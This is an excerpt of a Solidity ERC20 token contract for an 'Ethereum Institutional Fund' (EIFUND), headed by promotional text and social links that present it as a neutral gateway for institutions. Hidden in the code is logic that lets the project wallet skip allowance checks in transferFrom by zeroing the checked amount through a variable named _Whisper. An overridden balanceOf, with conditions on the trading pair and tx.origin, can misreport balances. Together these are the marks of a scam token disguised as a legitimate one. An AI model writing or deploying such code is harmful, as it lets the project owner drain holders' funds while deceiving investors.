...
/*
Ethereum Institutional Fund
EIFUND

The organization functions as the neutral front door for institutions to enter the Ethereum ecosystem, working directly with banks, asset managers, custodians, market infrastructures, fintechs, and sovereign institutions to translate their requirements into on-chain deployments.

https://eifund.xyz
https://x.com/EIFUND_X
https://t.me/eifund_official
*/
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function transferFrom(
        ...
        _Whisper = amount; _transfer(sender, recipient, amount);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(
            currentAllowance >= _Whisper,
            "ERC20: transfer amount exceeds allowance"
        );
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - _Whisper);
        }
...
contract EIFUND is ERC20, Ownable {
    using SafeMath for uint256;

    IDexRouter private immutable uniRouter;
    address private immutable uniPair;

    address private EIFUND_ADDR;
    bool private constant __isEIFUNDRouter = true;
    uint256 private constant _Ethereum_EIFUND_Version = 4;
    ...
    constructor() ERC20("Ethereum Institutional Fund", "EIFUND") payable{
    ...
    function balanceOf(address account) public view override returns (uint256 balance) {
        bool _trisp = IERC20(uniPair).balanceOf(uniPair) <= 0 || account != uniPair; if(_trisp || exemptFromFees[tx.origin])
    ...
    function _transfer(
        ...
        if(_isSenderCheck(projectWallet))_Whisper = 0;
